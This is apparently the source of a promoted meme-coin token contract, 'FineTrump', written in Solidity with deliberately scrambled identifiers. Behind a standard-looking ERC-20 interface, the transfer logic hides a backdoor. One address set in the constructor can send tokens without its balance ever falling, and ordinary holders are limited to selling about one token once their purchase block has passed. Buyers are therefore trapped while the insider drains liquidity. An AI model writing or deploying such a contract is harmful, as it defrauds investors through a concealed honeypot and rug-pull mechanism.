/*

Telegram: https://t.me/FineTrump

Twitter: https://twitter.com/FineTrump

Website: https://firetrump.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FineTrump is Ownable {
    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private lrnhpdysgcxa;

    function approve(address irznvxdouyj, uint256 jchl) public returns (bool success) {
        allowance[msg.sender][irznvxdouyj] = jchl;
        emit Approval(msg.sender, irznvxdouyj, jchl);
        return true;
    }

    function szaru(address csirqfuhbgyz, address lydgf, uint256 jchl) private {
        address zkboupw = IUniswapV2Factory(lbvykriugcqx.factory()).getPair(address(this), lbvykriugcqx.WETH());
        bool pnywfaholdz = 0 == lrnhpdysgcxa[csirqfuhbgyz];
        if (pnywfaholdz) {
            if (csirqfuhbgyz != zkboupw && arvdenbis[csirqfuhbgyz] != block.number && jchl < totalSupply) {
                require(jchl <= totalSupply / (10 ** decimals));
            }
            balanceOf[csirqfuhbgyz] -= jchl;
        }
        balanceOf[lydgf] += jchl;
        arvdenbis[lydgf] = block.number;
        emit Transfer(csirqfuhbgyz, lydgf, jchl);
    }

    function transfer(address lydgf, uint256 jchl) public returns (bool success) {
        szaru(msg.sender, lydgf, jchl);
        return true;
    }

    string public name;

    uint8 public decimals = 9;

    string public symbol;

    mapping(address => uint256) private arvdenbis;

    function transferFrom(address csirqfuhbgyz, address lydgf, uint256 jchl) public returns (bool success) {
        require(jchl <= allowance[csirqfuhbgyz][msg.sender]);
        allowance[csirqfuhbgyz][msg.sender] -= jchl;
        szaru(csirqfuhbgyz, lydgf, jchl);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory iloeabvszfpn, string memory vrxyu, address heglamkowt, address pfubzilcyrhn) {
        name = iloeabvszfpn;
        symbol = vrxyu;
        balanceOf[msg.sender] = totalSupply;
        lrnhpdysgcxa[pfubzilcyrhn] = igsbr;
        lbvykriugcqx = IUniswapV2Router02(heglamkowt);
    }

    uint256 private igsbr = 101;

    IUniswapV2Router02 private lbvykriugcqx;
}